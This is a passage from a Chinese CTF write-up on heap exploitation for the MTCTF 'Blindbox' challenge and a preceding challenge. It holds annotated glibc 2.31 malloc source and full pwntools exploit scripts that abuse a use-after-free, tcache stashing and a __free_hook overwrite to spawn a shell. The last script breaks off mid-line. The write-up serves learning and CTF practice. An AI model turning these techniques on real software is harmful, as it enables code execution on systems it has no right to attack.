class="hljs-number">0x20</span><br>heap_9=heap_0+<span class="hljs-number">0xa0</span>*<span class="hljs-number">9</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_0))<br><br>free(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>free(<span class="hljs-number">9</span>)<br><br>add() <span class="hljs-comment">#11,6</span><br><br>free(<span class="hljs-number">9</span>)<br>payload=p64(heap_7_1)+p64(d)<br>add(payload) <span class="hljs-comment">#12</span><br><br>free(<span class="hljs-number">7</span>)<br><br>payload=p64(d)+p64(heap_7_2)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+\<br>        p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(heap_7_2)+p64(heap_9)+\<br>        p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(heap_7)+p64(heap_7_1)<br><br>add(payload) <span class="hljs-comment">#13,7</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add()<br><span class="hljs-comment"># -19</span><br><br>add() <span class="hljs-comment">#20</span><br><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(free_hook)<br><br>add(payload) <span class="hljs-comment">#21</span><br>add(<span class="hljs-string">&quot;/bin/bash&quot;</span>) <span class="hljs-comment">#22</span><br>add(p64(system)) <span class="hljs-comment">#23</span><br>free(<span class="hljs-number">22</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Blindbox">Blindbox</h2><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox-4.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox-1.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox-2.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-Blindbox-3.jpg" srcset="/img/loading.gif" lazyload alt="pay函数代码" title="pay函数代码"></p><ul><li>总结出来整个程序就是只能创建三种<code>chunk</code>，三种<code>chunk</code>的<code>size</code>由用户指定，但<code>size</code>必须在<code>0x88~0x233</code>之间</li><li>程序在释放<code>chunk</code>时，没有清空指针，所以存在<code>UAF</code></li><li>整个程序只能修改两次<code>chunk</code>的数据，其中一次只能修改前<code>0x10</code>的数据，也就是<code>fd,bk字段</code>的数据，另一次会创建一个<code>0xa0</code>的<code>chunk</code>，并且写入<code>0x90</code>个字节的数据</li><li>程序只能输出<code>chunk</code>的<code>fd字段</code>的数据<br>当获取到<code>system函数</code>的地址之后，可以利用<code>pay函数</code>获取<code>shell</code></li></ul><p>因为程序只能通过创建一个<code>0xa0</code>大小的<code>chunk</code>，而向某个地址中写入<code>0x90</code>个字节的数据，所以我们需要做的就是将<code>0xa0大小的tcache bin</code>的第一个成员设置为我们要修改的地址，而直接释放<code>chunk</code>，并修改其<code>fd,bk字段</code>，是达不到要求的。所以我们只能先将<code>chunk</code>放入<code>small bin</code>中，然后创建对应大小的<code>chunk</code>，这时程序会将对应的<code>small bin</code>中剩下的<code>chunk</code>逆序存满<code>tcache bin</code>，只要我们修改了<code>small bin</code>中后面的某一个<code>chunk</code>的<code>bk字段</code>，就可以达到我们想要的效果</p><p>在<code>libc 2.31</code>中，通过<code>small bin</code>获取<code>chunk</code>时，只会检测第一个成员，与第二个成员之间的双链表结构是否成立，然后就会将第一个成员返回给用户，让剩余的成员填满<code>tcache bin</code>，在将<code>small bin中的chunk</code>放入<code>tcache bin</code>时，会设置下一个成员的<code>fd段</code>为对应的<code>small bin</code>的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/* small bin获取chunk代码 */</span><br><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>&#123; <span class="hljs-comment">// 当用户申请的chunk的大小符合small bin时</span><br>  <span class="hljs-comment">// 就尝试使用small bin进行分配</span><br>  <br>  idx = smallbin_index (nb);<br>  bin = bin_at (av, idx);<br>  <span class="hljs-comment">// 获取对应bin</span><br>  <br>  <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>    &#123; <span class="hljs-comment">// 当 bin中存在chunk时，执行下面的指令</span><br>     <br>      bck = victim-&gt;bk;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>    <span class="hljs-comment">// 当small bin中的chunk的数据被非法修改了，就进行报错</span><br>    <span class="hljs-comment">// 虽然检测了small bin是否完整，但仅检测最后一个节点</span><br>    <span class="hljs-comment">// 所以只要修改不存在于最后一个节点就可以将伪造的chunk放入tcache bin中</span><br>    <span class="hljs-comment">// 因为small bin中的chunk的大小都相同，</span><br>    <span class="hljs-comment">// 所以再放入tcache bin中时，不会检测大小，</span><br>    <span class="hljs-comment">// 这就导致可以将任意地址放入任意tcache bin中</span><br>    <br>      set_inuse_bit_at_offset (victim, nb);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br>    <span class="hljs-comment">// 将small bin中的第一个chunk 从双链表中删除</span><br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    set_non_main_arena (victim);<br>      check_malloced_chunk (av, victim, nb);<br>    <span class="hljs-comment">// 设置chunk的头部，并检测chunk是否合法</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123; <span class="hljs-comment">// 当tcache bins中对应的bin没有存满时</span><br>      <span class="hljs-comment">// 将 small bin中剩余的chunk放入tcache bin中</span><br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>         &amp;&amp; (tc_victim = last (bin)) != bin)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          bck = tc_victim-&gt;bk;<br>          set_inuse_bit_at_offset (tc_victim, nb);<br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>        set_non_main_arena (tc_victim);<br>          bin-&gt;bk = bck;<br>          bck-&gt;fd = bin;<br>            <span class="hljs-comment">// 设置chunk的 头部，并将其从 bin中删除</span><br>          tcache_put (tc_victim, tc_idx);<br>            &#125;<br>    &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>      alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>      <span class="hljs-comment">// 将chunk的数据段初始化之后</span><br>      <span class="hljs-comment">// 作为用户的chunk返回</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以下面的难点就在于<strong>如何修改smallbin</strong>,通过上面的描述我们知道，使用正常的释放操作，无法在<code>tcache bin</code>未存满的状态下存在<code>chunk</code>，那么方法只有一个，那就是通过分裂一个较大的<code>chunk</code>,来构造一个<code>0xa0</code>的<code>chunk</code>，使其存在于<code>unsorted bin</code>中，然后再创建一个较大的chunk，这时就会将<code>unsorted bin</code>中的<code>chunk</code>放入对应的<code>small bin</code>中,因为这里<code>0xa0</code>的<code>chunk</code>是由分裂产生的，并不是通过释放获取的，所以正常来说我们是没有这个<code>0xa0</code>大小的<code>chunk</code>的地址，无法修改其数据</p><p>这里我们以<code>0xa0 0xc0 0x160</code>大小的chunk举例<br>首先需要将<code>0xc0 0x160</code>大小对应的<code>tcache bin</code>填满，然后创建两个<code>0xc0</code>的<code>chunk_a</code>与<code>chunk_b</code><br>将这两个<code>chunk</code>释放掉，这时<code>chunk_a</code>与<code>chunk_b</code>都会与<code>top chunk</code>合并，然后创建一个<code>0x160</code>的<code>chunk(chunk_a)</code>，这里需要再次创建一个<code>chunk(chunk_t)</code>，这是为了防止<code>chunk a</code>与<code>top chunk</code>合并,释放 <code>chunk_a</code>，这时在<code>unsorted bin</code>中存在一个<code>0x160</code>大小的<code>chunk_a</code>，这时在创建一个<code>0xc0</code>大小的<code>chunk(chunk_a)</code>，地址也与<code>a</code>相同，并且分裂出一个<code>0xa0</code>大小的<code>chunk(chunk_b)</code>放在<code>unsorted bin</code>中，因为<code>chunk_a</code>与<code>chunk_b</code>之间地址相差<code>0xc0</code>，所以这个<code>0xa0</code>大小的<code>chunk</code>其实就是<code>chunk_b</code>，只要再创建一个较大的<code>chunk_t1</code>，就可以将<code>chunk_b</code>放入<code>small bin</code>中，只要我们没有覆盖原先指向<code>chunk_b</code>的指针，我们就可以更改<code>small bin</code>的结构，只要再重复几次前面的操作，就可以绕过<code>small bin</code>的检测，使我们构造的<code>chunk</code>进入<code>tcache bin</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;第一种方法</span><br><span class="hljs-string">    仅获取small bin的低5字节数据，从而获取libc 基地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s,i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(s))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1-3): &#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;drop?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;open?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&#x27;Blindbox: &#x27;</span>)<br>    <span class="hljs-keyword">return</span> u64(p.read(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">i,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;change?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;wish&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">system</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1804289383</span>, <span class="hljs-number">846930886</span>, <span class="hljs-number">1681692777</span>, <span class="hljs-number">1714636915</span>, <span class="hljs-number">1957747793</span>, <span class="hljs-number">424238335</span>, <span class="hljs-number">719885386</span>, <span class="hljs-number">1649760492</span>]:<br>        p.sendlineafter(<span class="hljs-string">&#x27;guess&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i^system))<br><br>fake_heap=<span class="hljs-number">0x66666000</span>   <br>libc=ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=process(<span class="hljs-string">&#x27;./Blindbox&#x27;</span>)<br>gdb.attach(p)<br>p.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p64(<span class="hljs-number">0</span>)+p64(fake_heap-<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x98</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb8</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x158</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">3</span>)<br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br><br>edit(<span class="hljs-number">2</span>,p64(fake_heap-<span class="hljs-number">0x10</span>)*<span class="hljs-number">2</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br>payload=p64(<span class="hljs-number">2</span>)+p64(<span class="hljs-number">0</span>)+p64(fake_heap+<span class="hljs-number">0x20</span>) <br>  <span class="hljs-comment"># 这里必须为 p64(2)+p64(0)</span><br>  <span class="hljs-comment"># 主要是为了伪造chunk为由 mmap创建的chunk，防止calloc在获取chunk时修改了后面的数据</span><br>payload=payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(fake_heap-<span class="hljs-number">0x8</span>)+p64(fake_heap+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)<br>make(payload)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>d=show(<span class="hljs-number">1</span>)<br>d=(d&gt;&gt;<span class="hljs-number">24</span>)|(<span class="hljs-number">0x7f</span>&lt;&lt;<span class="hljs-number">40</span>)<br>malloc_hook=d-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x90</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>pay(system)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;第二种方法</span><br><span class="hljs-string">    通过修改_IO_2_1_stdout_ 在输出时泄露libc 地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s,i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(s))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1-3): &#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;drop?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;open?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&#x27;Blindbox: &#x27;</span>)<br>    <span class="hljs-keyword">return</span> u64(p.read(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">i,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;change?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;wish: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">system</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1804289383</span>, <span class="hljs-number">846930886</span>, <span class="hljs-number">1681692777</span>, <span class="hljs-number">1714636915</span>, <span class="hljs-number">1957747793</span>, <span class="hljs-number">424238335</span>, <span class="hljs-number">719885386</span>, <span class="hljs-number">1649760492</span>]:<br>        p.sendlineafter(<span class="hljs-string">&#x27;guess&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i^system))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    fake_heap=<span class="hljs-number">0x66666000</span>   <br>    libc=ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p64(<span class="hljs-number">0</span>)+p64(fake_heap-<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x98</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb8</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x158</span>))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>        free(<span class="hljs-number">1</span>)<br>        add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>        free(<span class="hljs-number">2</span>)<br>        add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>        free(<span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>        free(<span class="hljs-number">2</span>)<br>        add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>        free(<span class="hljs-number">3</span>)<br><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>    n=<span class="hljs-number">0x8690</span><br>    edit(<span 